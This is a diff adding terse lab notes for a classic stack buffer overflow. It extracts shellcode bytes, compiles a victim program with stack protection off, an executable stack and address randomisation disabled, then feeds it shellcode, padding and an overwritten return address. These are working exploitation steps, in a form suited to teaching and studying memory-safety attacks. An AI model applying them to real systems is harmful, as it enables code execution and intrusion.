@@ -1,0 +1,31 @@
+# gcc shell.c
+
+# objdump -d a.out | sed -n '/needle0/,/needle1/p'
+
+Find the distance between needle0 and needle1 and align the distance to 32 byte, e.g., align 29 to 32.
+
+# echo $((<needle1>-<needle0>))
+
+# xxd -s0x4bf -l32 -p a.out shellcode
+
+# gcc -fno-stack-protector -o victim victim.c
+# execstack -s victim
+# setarch `arch` -R ./victim
+
+# a=`printf %016x 0x7fffffffe090 | tac -rs..`
+
+# ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) | setarch `arch` -R ./victim
+
+
+#### Stack Layout ####
+----------------------
+
+        ... ...
+
+----------------------
+return address (8 bytes)
+----------------------
+RBP Register (8 bytes)
+----------------------
+64 bytes buf (64 bytes)
+######################
